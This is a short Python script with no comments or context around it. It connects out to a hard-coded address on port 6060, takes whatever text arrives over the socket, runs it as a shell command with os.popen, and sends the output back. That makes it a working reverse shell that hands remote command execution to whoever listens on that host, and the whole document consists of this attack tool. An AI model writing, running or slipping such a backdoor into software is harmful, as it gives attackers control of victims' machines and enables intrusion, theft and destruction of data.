import socket
import os

CLIENT_IP = "192.168.1.120"
CLIENT_PORT = 6060

client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client_socket.connect((CLIENT_IP,CLIENT_PORT))

while True:
    data_receive = client_socket.recv(1024).decode()
    try:
        os_resualt = os.popen(data_receive).read()
        client_socket.send(os_resualt.encode())
    except:
        pass
